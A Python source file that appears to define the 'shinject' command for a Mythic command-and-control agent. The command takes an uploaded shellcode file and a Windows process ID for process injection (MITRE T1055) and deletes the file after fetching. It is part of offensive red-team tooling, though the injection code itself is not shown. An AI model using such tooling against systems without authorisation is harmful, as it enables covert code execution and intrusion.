from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicRPC import *
import json
import sys
import base64

class ShinjectArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="shellcode", 
                type=ParameterType.File, 
                description="Shellcode to inject"
            ),
            CommandParameter(
                name="process_id",
                type=ParameterType.Number,
                description="ID of process to inject into",
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                raise ValueError("Missing JSON arguments")
        else:
            raise ValueError("Missing arguments")


class ShinjectCommand(CommandBase):
    cmd = "shinject"
    needs_admin = False
    help_cmd = "shinject"
    description = (
        "Inject shellcode from local file into target process"
    )
    version = 1
    supported_ui_features = ["process_browser:inject"]
    author = "@ajpc500"
    attackmapping = [ "T1055" ]

    argument_class = ShinjectArguments
    attributes = CommandAttributes(
        supported_python_versions=["Python 2.7", "Python 3.8"],
        supported_os=[ SupportedOS.Windows ]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        try:
            file_resp = await MythicRPC().execute(
                "get_file", 
                task_id=task.id,
                file_id=task.args.get_arg("shellcode"),
                get_contents=False
            )
            if file_resp.status == MythicStatus.Success:
                original_file_name = file_resp.response[0]["filename"]

                if len(file_resp.response) > 0:
                    task.display_params = "Injecting {} into PID {}".format(original_file_name, task.args.get_arg("process_id"))
                elif len(file_resp.response) == 0:
                    raise Exception("Failed to find the named file. Have you uploaded it before? Did it get deleted?")
            
            file_resp = await MythicRPC().execute("update_file",
                file_id=task.args.get_arg("shellcode"),
                delete_after_fetch=True,
                comment="Uploaded into memory for shinject"
            )
        except Exception as e:
            raise Exception("Error from Mythic: " + str(sys.exc_info()[-1].tb_lineno) + str(e))    
        
        return task

    async def process_response(self, response: AgentResponse):
        pass
